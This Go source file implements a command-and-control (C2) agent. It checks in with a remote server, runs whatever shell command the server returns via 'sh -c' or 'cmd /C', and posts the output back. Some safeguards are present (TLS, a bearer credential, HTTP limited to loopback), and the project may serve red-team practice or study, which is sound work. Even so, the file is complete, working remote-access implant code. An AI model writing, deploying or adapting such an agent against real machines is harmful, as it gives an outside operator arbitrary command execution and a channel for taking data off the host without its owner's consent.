// Package agent implements the C2 agent that checks in with the server,
// executes received commands, and reports results back.
package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/lsanarchist/c2/pkg/protocol"
)

const clientTimeout = 10 * time.Second

// Options configures security behavior for the agent client.
type Options struct {
	Credential    string
	AllowHTTP     bool
	TLSServerName string
	CACertFile    string
	HTTPClient    *http.Client
}

// Agent periodically checks in with the C2 server.
type Agent struct {
	id            string
	hostname      string
	serverURL     string
	interval      time.Duration
	credential    string
	allowHTTP     bool
	tlsServerName string
	caCertFile    string
	httpClient    *http.Client
}

// New creates a new Agent.
func New(id, hostname, serverURL string, interval time.Duration, opts Options) (*Agent, error) {
	a := &Agent{
		id:            id,
		hostname:      hostname,
		serverURL:     serverURL,
		interval:      interval,
		credential:    opts.Credential,
		allowHTTP:     opts.AllowHTTP,
		tlsServerName: opts.TLSServerName,
		caCertFile:    opts.CACertFile,
		httpClient:    opts.HTTPClient,
	}

	if err := a.validateConfig(); err != nil {
		return nil, err
	}
	if a.httpClient == nil {
		httpClient, err := a.buildHTTPClient()
		if err != nil {
			return nil, err
		}
		a.httpClient = httpClient
	}

	return a, nil
}

func (a *Agent) validateConfig() error {
	if strings.TrimSpace(a.id) == "" {
		return errors.New("agent id is required")
	}
	if a.interval <= 0 {
		return fmt.Errorf("interval must be greater than zero: %s", a.interval)
	}
	if strings.TrimSpace(a.credential) == "" {
		return errors.New("agent credential is required")
	}

	parsedURL, err := url.Parse(a.serverURL)
	if err != nil {
		return fmt.Errorf("invalid server URL: %w", err)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		return fmt.Errorf("server URL must use http or https: %q", a.serverURL)
	}
	if parsedURL.Host == "" {
		return fmt.Errorf("server URL host is required: %q", a.serverURL)
	}
	if parsedURL.Scheme == "http" {
		if !a.allowHTTP {
			return errors.New("http is disabled; use https or explicitly enable dev HTTP mode")
		}
		host := parsedURL.Hostname()
		if !isLoopbackHost(host) {
			return errors.New("dev HTTP is only allowed on loopback hosts")
		}
	}
	return nil
}

func isLoopbackHost(host string) bool {
	if host == "localhost" {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback()
	}
	return false
}

func (a *Agent) buildHTTPClient() (*http.Client, error) {
	parsedURL, err := url.Parse(a.serverURL)
	if err != nil {
		return nil, fmt.Errorf("invalid server URL: %w", err)
	}
	if parsedURL.Scheme != "https" {
		return &http.Client{Timeout: clientTimeout}, nil
	}

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	if a.tlsServerName != "" {
		tlsConfig.ServerName = a.tlsServerName
	}

	if strings.TrimSpace(a.caCertFile) != "" {
		caPEM, err := os.ReadFile(a.caCertFile)
		if err != nil {
			return nil, fmt.Errorf("read ca certificate: %w", err)
		}
		roots := x509.NewCertPool()
		if !roots.AppendCertsFromPEM(caPEM) {
			return nil, errors.New("invalid CA certificate PEM")
		}
		tlsConfig.RootCAs = roots
	}

	transport := &http.Transport{TLSClientConfig: tlsConfig}
	return &http.Client{Timeout: clientTimeout, Transport: transport}, nil
}

// RunOnce performs a single check-in cycle. It is primarily useful for testing.
func (a *Agent) RunOnce(ctx context.Context) error {
	if err := a.validateConfig(); err != nil {
		return err
	}
	return a.checkIn(ctx)
}

// Run starts the agent check-in loop and exits when ctx is canceled.
func (a *Agent) Run(ctx context.Context) error {
	if err := a.validateConfig(); err != nil {
		return err
	}

	log.Printf("[agent] starting, id=%s server=%s", a.id, a.serverURL)
	ticker := time.NewTicker(a.interval)
	defer ticker.Stop()

	if err := a.RunOnce(ctx); err != nil {
		log.Printf("[agent] initial check-in failed: %v", err)
	}

	for {
		select {
		case <-ctx.Done():
			log.Printf("[agent] stopping: %v", ctx.Err())
			return nil
		case <-ticker.C:
			if err := a.checkIn(ctx); err != nil {
				log.Printf("[agent] check-in failed: %v", err)
			}
		}
	}
}

// checkIn sends a check-in request to the server and handles any returned command.
func (a *Agent) checkIn(ctx context.Context) error {
	ci := protocol.CheckIn{
		ID:       a.id,
		Hostname: a.hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}

	body, err := json.Marshal(ci)
	if err != nil {
		return fmt.Errorf("marshal check-in: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/checkin", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build check-in request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+a.credential)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("check-in failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("check-in unexpected response: %d", resp.StatusCode)
	}

	var ciResp protocol.CheckInResponse
	if err := decodeStrictJSONResponse(resp.Body, &ciResp); err != nil {
		return fmt.Errorf("decode check-in response: %w", err)
	}

	if ciResp.Command == "" {
		return nil
	}

	log.Printf("[agent] executing command %s", ciResp.CommandID)
	output, execErr := a.execute(ciResp.Command)

	result := protocol.Result{
		AgentID:   a.id,
		CommandID: ciResp.CommandID,
		Output:    output,
	}
	if execErr != nil {
		result.Error = execErr.Error()
	}

	if err := a.sendResult(ctx, result); err != nil {
		return err
	}
	return nil
}

func decodeStrictJSONResponse(body io.Reader, dst any) error {
	dec := json.NewDecoder(body)
	dec.DisallowUnknownFields()
	if err := dec.Decode(dst); err != nil {
		return err
	}
	if err := dec.Decode(&struct{}{}); err != io.EOF {
		return errors.New("multiple JSON values")
	}
	return nil
}

// execute runs the given shell command and returns its combined output.
func (a *Agent) execute(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sendResult posts a command result back to the server.
func (a *Agent) sendResult(ctx context.Context, result protocol.Result) error {
	body, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("marshal result: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/result", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build result request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+a.credential)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("send result: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		return fmt.Errorf("unexpected result response: %d", resp.StatusCode)
	}
	return nil
}
